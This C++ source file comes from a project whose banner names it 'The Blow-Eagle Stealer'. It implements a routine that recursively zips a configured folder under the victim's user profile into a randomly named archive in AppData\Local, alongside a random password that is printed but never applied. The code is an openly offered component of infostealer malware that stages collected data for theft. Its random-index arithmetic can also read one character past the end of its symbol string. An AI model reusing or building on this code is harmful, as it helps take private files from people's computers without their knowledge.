/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../scripts.h"
#include "../../config/config.cpp"
#include "../../helper/helper.h"

#include <fstream>
#include <zip.h>

int create_archive(std::string archive_name, std::string password, std::string folder_path) {
    zip_t* archive = zip_open(archive_name.c_str(), ZIP_CREATE | ZIP_EXCL, 0);
    if (!archive) {
        std::cerr << "Failed to create the archive." << std::endl;
        return -1;
    }

    //try {
    //    zip_set_default_password(archive, password.c_str());
    //}
    //catch (const std::exception& e) {
    //    std::cerr << "Error: " << e.what() << std::endl;
    //}

    std::filesystem::path absolute_path = std::filesystem::absolute(folder_path);
    for (const auto& entry : std::filesystem::recursive_directory_iterator(absolute_path)) {
        std::string entry_path = entry.path().string();
        std::string entry_name = std::filesystem::relative(entry_path, absolute_path).string();
        std::string archive_path = entry_name;
        std::replace(archive_path.begin(), archive_path.end(), '\\', '/'); // replace '\' to '/'
        zip_source_t* source = zip_source_file(archive, entry_path.c_str(), 0, 0);
        if (!source) {
            std::cerr << "Failed to create a zip source for the entry '" << entry_name << "'." << std::endl;
            zip_close(archive);
            return -1;
        }

        if (std::filesystem::is_directory(entry)) { // add directory to archive
            if (zip_dir_add(archive, archive_path.c_str(), ZIP_FL_ENC_GUESS) < 0) {
                std::cerr << "Failed to add the entry '" << entry_name << "' to the archive." << std::endl;
                zip_source_free(source);
                zip_close(archive);
                return -1;
            }
        }
        else { // add file to archive
            if (zip_file_add(archive, archive_path.c_str(), source, ZIP_FL_ENC_GUESS) < 0) {
                std::cerr << "Failed to add the entry '" << entry_name << "' to the archive." << std::endl;
                zip_source_free(source);
                zip_close(archive);
                return -1;
            }
        }
    }
    if (zip_close(archive) < 0) {
        std::cerr << "Failed to save and close the archive." << std::endl;
        return -1;
    }
    return 0;
}

void manager::MakeZip()
{
    std::string user = func::GetUser();

	std::string symbols = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
	std::string name = "";
	std::string pwd = "";
	srand(time(0));
	for (size_t i = 0; i < 30; i++)
	{
		int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
		name += symbols[number];
	}
    std::string appdata = "C:/Users/" + user + "/AppData/Local";

    name += ".zip";

    name = appdata + "/" + name;

	for (size_t i = 0; i < 60; i++)
	{
		int number = (rand() % (std::size(symbols) - 0 + 1)) + 0;
		pwd += symbols[number];
	}

	std::cout << "zipName: " << name << "\nzipPWD: " << pwd << "\n";

    const std::string folderPath = "C:/Users/" + user + config::path;

    create_archive(name, pwd, folderPath);
}
